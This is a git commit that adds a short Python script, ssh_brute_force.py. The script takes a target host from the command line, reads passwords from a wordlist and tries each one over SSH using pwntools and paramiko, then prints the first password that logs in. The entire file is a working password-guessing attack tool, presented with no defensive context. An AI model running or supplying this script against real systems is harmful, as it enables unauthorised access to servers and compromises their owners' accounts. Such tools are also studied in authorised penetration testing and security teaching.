9380702891f992f77c80469abe73183dec6b12a1
n3k7ar91 <114411757+n3k7ar91@users.noreply.github.com>
2022-09-26 09:29:45 -0400

    Add files via upload

---
+++ ssh_brute_force.py
@@ -0,0 +1,31 @@
+import sys
+from pwn import * 
+import paramiko 
+
+host = sys.argv[1]
+username = "" #populate usernames
+attempts = 0
+
+
+print("*"*10)
+print("Target is {}".format(host))
+
+
+with open("password_list.txt", "r") as password_list:   # add wordlist path 
+	for password in password_list:
+		password=password.strip("\n")
+		try:
+			print("[{}] Attemting password '{}'!".format(attempts,password))
+			response = ssh(host=host, user = username, password=password, timeout=1)
+			if response.connected():
+				print("Valid password found: {}!".format(password))
+				response.close()
+				break
+			
+			response.close()
+		except paramiko.ssh_exception.AuthenticationException:
+			print("Invalid password")
+		attempts+=1
+
+
+
